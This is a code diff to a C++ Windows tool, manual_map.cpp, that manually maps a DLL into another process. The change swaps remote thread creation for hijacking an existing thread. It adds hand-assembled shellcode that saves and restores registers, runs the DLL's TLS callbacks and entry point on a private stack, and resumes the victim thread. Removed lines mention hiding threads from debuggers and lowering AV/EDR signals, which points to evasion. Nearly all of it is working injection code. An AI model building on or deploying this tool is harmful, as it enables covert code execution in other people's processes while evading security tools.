@@ -1,4 +1,6 @@
-// manual_map.cpp - NtCreateThreadEx injector with TLS, remote LoadLibrary, proper memory protection.
+// manual_map.cpp - Thread-hijack manual mapper.
+// No new threads created in target process: hijacks existing thread's RIP,
+// runs TLS + DllMain on a private stack, restores full context, jumps back.
 // Compile: g++ -std=c++17 -O2 -m64 -municode manual_map.cpp -static -o manual_map.exe
 
 #include <windows.h>
@@ -46,7 +48,6 @@ uintptr_t remote_module_base(DWORD pid,const std::string& name_lower){
     return 0;
 }
 
-// Force-load a DLL inside the target process via CreateRemoteThread(LoadLibraryW).
 bool remote_load_library(HANDLE p, const std::wstring& dll_name){
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
     if(!k32) return false;
@@ -105,47 +106,93 @@ bool load_pe(const std::wstring& path, PeData& pe){
     return true;
 }
 
-// Shellcode: for each callback in order, call callback(base, DLL_PROCESS_ATTACH, NULL).
-// TLS callbacks first, then DLL entry point.
-std::vector<uint8_t> build_shellcode(const std::vector<uintptr_t>& callbacks, uintptr_t dll_base){
+// Build hijack shellcode:
+//   1) save all GPRs + rflags to save_area
+//   2) switch rsp to private stack
+//   3) for each callback: call cb(base, DLL_PROCESS_ATTACH=1, NULL)
+//   4) restore all GPRs + rflags + rsp from save_area
+//   5) jmp back to original_rip via r11 (volatile per MS x64 ABI, expendable)
+std::vector<uint8_t> build_hijack_shellcode(
+    const std::vector<uintptr_t>& callbacks,
+    uintptr_t dll_base,
+    uintptr_t save_area_addr,
+    uintptr_t stack_top_addr,
+    uintptr_t original_rip)
+{
     std::vector<uint8_t> sc;
-    auto emit = [&](std::initializer_list<uint8_t> bs){ for(uint8_t x:bs) sc.push_back(x); };
-    emit({0x48,0x83,0xEC,0x28}); // sub rsp, 0x28
+    auto emit  = [&](std::initializer_list<uint8_t> bs){ for(uint8_t x:bs) sc.push_back(x); };
+    auto emit64 = [&](uint64_t v){ for(int i=0;i<8;i++) sc.push_back((uint8_t)(v>>(i*8))); };
+
+    // mov r11, save_area_addr
+    emit({0x49, 0xBB}); emit64(save_area_addr);
+
+    // Save GPRs (r11 itself is the scratch reg used to address save_area; not preserved).
+    // Layout: rax=00 rcx=08 rdx=10 rbx=18 rsp=20 rbp=28 rsi=30 rdi=38
+    //         r8=40  r9=48  r10=50 r12=58 r13=60 r14=68 r15=70 rflags=78
+    emit({0x49, 0x89, 0x43, 0x00}); // mov [r11+0x00], rax
+    emit({0x49, 0x89, 0x4B, 0x08}); // mov [r11+0x08], rcx
+    emit({0x49, 0x89, 0x53, 0x10}); // mov [r11+0x10], rdx
+    emit({0x49, 0x89, 0x5B, 0x18}); // mov [r11+0x18], rbx
+    emit({0x49, 0x89, 0x63, 0x20}); // mov [r11+0x20], rsp
+    emit({0x49, 0x89, 0x6B, 0x28}); // mov [r11+0x28], rbp
+    emit({0x49, 0x89, 0x73, 0x30}); // mov [r11+0x30], rsi
+    emit({0x49, 0x89, 0x7B, 0x38}); // mov [r11+0x38], rdi
+    emit({0x4D, 0x89, 0x43, 0x40}); // mov [r11+0x40], r8
+    emit({0x4D, 0x89, 0x4B, 0x48}); // mov [r11+0x48], r9
+    emit({0x4D, 0x89, 0x53, 0x50}); // mov [r11+0x50], r10
+    emit({0x4D, 0x89, 0x63, 0x58}); // mov [r11+0x58], r12
+    emit({0x4D, 0x89, 0x6B, 0x60}); // mov [r11+0x60], r13
+    emit({0x4D, 0x89, 0x73, 0x68}); // mov [r11+0x68], r14
+    emit({0x4D, 0x89, 0x7B, 0x70}); // mov [r11+0x70], r15
+    // rflags via pushfq / pop rax / mov [r11+0x78], rax
+    emit({0x9C});                   // pushfq
+    emit({0x58});                   // pop rax
+    emit({0x49, 0x89, 0x43, 0x78}); // mov [r11+0x78], rax
+
+    // mov rsp, stack_top_addr (switch to our private stack)
+    emit({0x48, 0xBC}); emit64(stack_top_addr);
+
+    // For each callback: sub rsp,0x28 / mov rcx,base / mov edx,1 / xor r8d,r8d / mov rax,cb / call rax / add rsp,0x28
     for(uintptr_t cb : callbacks){
-        emit({0x48,0xB9});                                          // mov rcx, imm64
-        for(int i=0;i<8;i++) sc.push_back((uint8_t)(dll_base>>(i*8)));
-        emit({0xBA,0x01,0x00,0x00,0x00});                           // mov edx, 1 (DLL_PROCESS_ATTACH)
-        emit({0x45,0x31,0xC0});                                     // xor r8d, r8d
-        emit({0x48,0xB8});                                          // mov rax, imm64
-        for(int i=0;i<8;i++) sc.push_back((uint8_t)(cb>>(i*8)));
-        emit({0xFF,0xD0});                                          // call rax
+        emit({0x48, 0x83, 0xEC, 0x28});                         // sub rsp, 0x28
+        emit({0x48, 0xB9}); emit64(dll_base);                   // mov rcx, dll_base
+        emit({0xBA, 0x01, 0x00, 0x00, 0x00});                   // mov edx, 1
+        emit({0x45, 0x31, 0xC0});                               // xor r8d, r8d
+        emit({0x48, 0xB8}); emit64(cb);                         // mov rax, callback
+        emit({0xFF, 0xD0});                                     // call rax
+        emit({0x48, 0x83, 0xC4, 0x28});                         // add rsp, 0x28
     }
-    emit({0x48,0x83,0xC4,0x28}); // add rsp, 0x28
-    emit({0xC3});                // ret
+
+    // RESTORE. Re-load r11 in case a callback clobbered it.
+    emit({0x49, 0xBB}); emit64(save_area_addr);
+
+    // Restore rflags first (push rax / popfq while still on private stack)
+    emit({0x49, 0x8B, 0x43, 0x78}); // mov rax, [r11+0x78]
+    emit({0x50});                   // push rax
+    emit({0x9D});                   // popfq
+
+    // Restore GPRs (rsp restored last; r11 not restored)
+    emit({0x4D, 0x8B, 0x7B, 0x70}); // mov r15, [r11+0x70]
+    emit({0x4D, 0x8B, 0x73, 0x68}); // mov r14, [r11+0x68]
+    emit({0x4D, 0x8B, 0x6B, 0x60}); // mov r13, [r11+0x60]
+    emit({0x4D, 0x8B, 0x63, 0x58}); // mov r12, [r11+0x58]
+    emit({0x4D, 0x8B, 0x53, 0x50}); // mov r10, [r11+0x50]
+    emit({0x4D, 0x8B, 0x4B, 0x48}); // mov r9,  [r11+0x48]
+    emit({0x4D, 0x8B, 0x43, 0x40}); // mov r8,  [r11+0x40]
+    emit({0x49, 0x8B, 0x7B, 0x38}); // mov rdi, [r11+0x38]
+    emit({0x49, 0x8B, 0x73, 0x30}); // mov rsi, [r11+0x30]
+    emit({0x49, 0x8B, 0x6B, 0x28}); // mov rbp, [r11+0x28]
+    emit({0x49, 0x8B, 0x5B, 0x18}); // mov rbx, [r11+0x18]
+    emit({0x49, 0x8B, 0x53, 0x10}); // mov rdx, [r11+0x10]
+    emit({0x49, 0x8B, 0x4B, 0x08}); // mov rcx, [r11+0x08]
+    emit({0x49, 0x8B, 0x43, 0x00}); // mov rax, [r11+0x00]
+    emit({0x49, 0x8B, 0x63, 0x20}); // mov rsp, [r11+0x20]   <-- back to victim stack
+
+    // mov r11, original_rip ; jmp r11
+    emit({0x49, 0xBB}); emit64(original_rip);
+    emit({0x41, 0xFF, 0xE3});
+
     return sc;
-}
-
-typedef LONG (NTAPI* NtCreateThreadEx_t)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
-
-bool inject_thread(HANDLE p, uintptr_t shellcode_addr, uintptr_t base){
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    NtCreateThreadEx_t fn = ntdll ? (NtCreateThreadEx_t)GetProcAddress(ntdll,"NtCreateThreadEx") : nullptr;
-    if(fn){
-        HANDLE ht = NULL;
-        // flag 4 = THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
-        LONG st = fn(&ht, THREAD_ALL_ACCESS, NULL, p, (PVOID)shellcode_addr, (PVOID)base, 4, 0, 0, 0, NULL);
-        if(st>=0 && ht){
-            info("Thread OK (HIDE_FROM_DEBUGGER)");
-            CloseHandle(ht);
-            return true;
-        }
-        warn("NtCreateThreadEx failed, falling back to CreateRemoteThread");
-    }
-    HANDLE t = CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_addr, (PVOID)base, 0, NULL);
-    if(!t) return false;
-    info("CreateRemoteThread OK");
-    CloseHandle(t);
-    return true;
 }
 
 bool resolve_imports(HANDLE p, DWORD pid, uintptr_t base, PeData& pe){
@@ -167,7 +214,7 @@ bool resolve_imports(HANDLE p, DWORD pid, uintptr_t base, PeData& pe){
             }
             if(!rdb){
                 err("Failed to load "+std::string(rn)+" in target process");
-                desc++; continue; // skip this descriptor; might still work if function unused
+                desc++; continue;
             }
         }
 
@@ -234,9 +281,7 @@ bool apply_relocs(HANDLE p, uintptr_t base, PeData& pe){
 
 void protect_sections(HANDLE p, uintptr_t base, PeData& pe){
     DWORD old;
-    // Headers: read-only
     VirtualProtectEx(p, (PVOID)base, pe.nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old);
-
     for(int i=0; i<pe.nt->FileHeader.NumberOfSections; i++){
         auto& s = pe.sections[i];
         if(s.Misc.VirtualSize == 0) continue;
@@ -253,7 +298,6 @@ void protect_sections(HANDLE p, uintptr_t base, PeData& pe){
     }
 }
 
-// Walk IMAGE_DIRECTORY_ENTRY_TLS and return list of remote callback addresses.
 std::vector<uintptr_t> collect_tls_callbacks(uintptr_t base, PeData& pe){
     std::vector<uintptr_t> result;
     auto& dir = pe.nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
@@ -272,6 +316,51 @@ std::vector<uintptr_t> collect_tls_callbacks(uintptr_t base, PeData& pe){
     return result;
 }
 
+struct HijackTarget {
+    HANDLE handle;
+    DWORD  tid;
+    uintptr_t original_rip;
+};
+
+// Find a thread we can suspend and redirect.
+// Pass 0: prefer threads with Rip outside ntdll (i.e. actively running user code,
+//         not waiting in a syscall - faster activation of our shellcode).
+// Pass 1: take any suspendable thread.
+bool find_hijack_target(DWORD pid, HijackTarget& out){
+    uintptr_t ntdll_base = remote_module_base(pid, "ntdll.dll");
+    for(int pass = 0; pass < 2; pass++){
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if(snap == INVALID_HANDLE_VALUE) return false;
+        THREADENTRY32 te{sizeof(te)};
+        if(!Thread32First(snap, &te)){ CloseHandle(snap); continue; }
+        do {
+            if(te.th32OwnerProcessID != pid) continue;
+            HANDLE t = OpenThread(
+                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
+                FALSE, te.th32ThreadID);
+            if(!t) continue;
+            DWORD prev_suspend = SuspendThread(t);
+            if(prev_suspend == (DWORD)-1){ CloseHandle(t); continue; }
+            CONTEXT ctx{};
+            ctx.ContextFlags = CONTEXT_FULL;
+            if(!GetThreadContext(t, &ctx)){
+                ResumeThread(t); CloseHandle(t); continue;
+            }
+            if(pass == 0 && ntdll_base &&
+               ctx.Rip >= ntdll_base && ctx.Rip < ntdll_base + 0x300000){
+                ResumeThread(t); CloseHandle(t); continue;
+            }
+            out.handle = t;
+            out.tid = te.th32ThreadID;
+            out.original_rip = (uintptr_t)ctx.Rip;
+            CloseHandle(snap);
+            return true;
+        } while(Thread32Next(snap, &te));
+        CloseHandle(snap);
+    }
+    return false;
+}
+
 bool manual_map(DWORD pid, const std::wstring& dll_path){
     PeData pe;
     if(!load_pe(dll_path, pe)){ err("Bad PE"); return false; }
@@ -281,7 +370,6 @@ bool manual_map(DWORD pid, const std::wstring& dll_path){
     if(!p){ err("OpenProcess"); return false; }
     info("PID "+std::to_string(pid));
 
-    // Allocate as RW first (no execute bit) - reduces AV/EDR signal vs RWX up-front.
     LPVOID mem = VirtualAllocEx(p, NULL, pe.image_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if(!mem){ err("VirtualAllocEx (image)"); CloseHandle(p); return false; }
     uintptr_t base = (uintptr_t)mem;
@@ -300,29 +388,83 @@ bool manual_map(DWORD pid, const std::wstring& dll_path){
     if(!resolve_imports(p, pid, base, pe)){ CloseHandle(p); return false; }
     protect_sections(p, base, pe);
 
-    // Gather TLS callbacks, then DLL entry point. Call them in this order with DllMain semantics.
     auto callbacks = collect_tls_callbacks(base, pe);
     if(!callbacks.empty()) info("TLS callbacks: "+std::to_string(callbacks.size()));
     uintptr_t entry = pe.nt->OptionalHeader.AddressOfEntryPoint;
     if(entry != 0) callbacks.push_back(base + entry);
     if(callbacks.empty()){ warn("No entry point and no TLS callbacks"); CloseHandle(p); return true; }
 
-    // Stage shellcode in its own page: RW -> write -> RX (no RWX in memory map at any point).
-    auto sc = build_shellcode(callbacks, base);
-    LPVOID sc_mem = VirtualAllocEx(p, NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-    if(!sc_mem){ err("VirtualAllocEx (shellcode)"); CloseHandle(p); return false; }
-    WriteProcessMemory(p, sc_mem, sc.data(), sc.size(), &wr);
-    DWORD old;
-    VirtualProtectEx(p, sc_mem, 0x1000, PAGE_EXECUTE_READ, &old);
+    // Allocate save area + private 128KB stack as one RW region.
+    // Layout: [save_area 0x100][padding][private stack growing down from top].
+    const SIZE_T DATA_SIZE = 0x20000; // 128KB
+    LPVOID data_mem = VirtualAllocEx(p, NULL, DATA_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if(!data_mem){ err("VirtualAllocEx (data)"); CloseHandle(p); return false; }
+    uintptr_t save_area = (uintptr_t)data_mem;
+    uintptr_t stack_top = (uintptr_t)data_mem + DATA_SIZE;
+    info("Save+stack @ "+hex_str((uintptr_t)data_mem));
 
-    info("NtCreateThreadEx (HIDE_FROM_DEBUGGER)...");
-    if(inject_thread(p, (uintptr_t)sc_mem, base)){
-        info("SUCCESS! DLL @ "+hex_str(base)+" (shellcode @ "+hex_str((uintptr_t)sc_mem)+")");
-        CloseHandle(p);
-        return true;
+    // Find and suspend a hijack target.
+    HijackTarget tgt{};
+    info("Searching for hijack target...");
+    if(!find_hijack_target(pid, tgt)){
+        err("No hijackable thread found");
+        CloseHandle(p); return false;
     }
+    info("Hijacking TID "+std::to_string(tgt.tid)+" orig Rip="+hex_str(tgt.original_rip));
+
+    // Build shellcode with original_rip baked in.
+    auto sc = build_hijack_shellcode(callbacks, base, save_area, stack_top, tgt.original_rip);
+
+    // Allocate shellcode page (RW), write, then promote to RX.
+    SIZE_T sc_size = (sc.size() + 0xFFF) & ~SIZE_T(0xFFF);
+    if(sc_size < 0x1000) sc_size = 0x1000;
+    LPVOID sc_mem = VirtualAllocEx(p, NULL, sc_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    if(!sc_mem){
+        err("VirtualAllocEx (shellcode)");
+        ResumeThread(tgt.handle); CloseHandle(tgt.handle); CloseHandle(p); return false;
+    }
+    if(!WriteProcessMemory(p, sc_mem, sc.data(), sc.size(), &wr) || wr != sc.size()){
+        err("WriteProcessMemory (shellcode)");
+        ResumeThread(tgt.handle); CloseHandle(tgt.handle); CloseHandle(p); return false;
+    }
+    DWORD old;
+    if(!VirtualProtectEx(p, sc_mem, sc_size, PAGE_EXECUTE_READ, &old)){
+        err("VirtualProtectEx (shellcode RX)");
+        ResumeThread(tgt.handle); CloseHandle(tgt.handle); CloseHandle(p); return false;
+    }
+    info("Shellcode @ "+hex_str((uintptr_t)sc_mem)+" ("+std::to_string(sc.size())+" bytes)");
+
+    // Re-fetch context and redirect Rip.
+    CONTEXT ctx{};
+    ctx.ContextFlags = CONTEXT_FULL;
+    if(!GetThreadContext(tgt.handle, &ctx)){
+        err("GetThreadContext (refresh)");
+        ResumeThread(tgt.handle); CloseHandle(tgt.handle); CloseHandle(p); return false;
+    }
+    if((uintptr_t)ctx.Rip != tgt.original_rip){
+        warn("Thread Rip changed between find and redirect (was "+hex_str(tgt.original_rip)+
+             ", now "+hex_str((uintptr_t)ctx.Rip)+"); rebuilding shellcode");
+        // Rebuild shellcode with the new original_rip and rewrite. Temporarily RW.
+        VirtualProtectEx(p, sc_mem, sc_size, PAGE_READWRITE, &old);
+        sc = build_hijack_shellcode(callbacks, base, save_area, stack_top, (uintptr_t)ctx.Rip);
+        WriteProcessMemory(p, sc_mem, sc.data(), sc.size(), &wr);
+        VirtualProtectEx(p, sc_mem, sc_size, PAGE_EXECUTE_READ, &old);
+    }
+    ctx.Rip = (DWORD64)(uintptr_t)sc_mem;
+    if(!SetThreadContext(tgt.handle, &ctx)){
+        err("SetThreadContext");
+        ResumeThread(tgt.handle); CloseHandle(tgt.handle); CloseHandle(p); return false;
+    }
+    info("Rip redirected to shellcode");
+    if(ResumeThread(tgt.handle) == (DWORD)-1){
+        err("ResumeThread");
+        CloseHandle(tgt.handle); CloseHandle(p); return false;
+    }
+    CloseHandle(tgt.handle);
+
+    info("SUCCESS! DLL @ "+hex_str(base)+" (hijacked TID "+std::to_string(tgt.tid)+")");
     CloseHandle(p);
-    return false;
+    return true;
 }
 
 bool is_x64_dll(const std::wstring& path){
@@ -350,7 +492,7 @@ bool is_x64_process(DWORD pid){
 
 int wmain(int argc, wchar_t* argv[]){
     if(argc < 3){
-        std::wcout << L"Manual Map Injector\nUsage: manual_map.exe <dll> --process <name>\n";
+        std::wcout << L"Manual Map Injector (thread hijack)\nUsage: manual_map.exe <dll> --process <name>\n";
         return 1;
     }
     std::wstring dll;
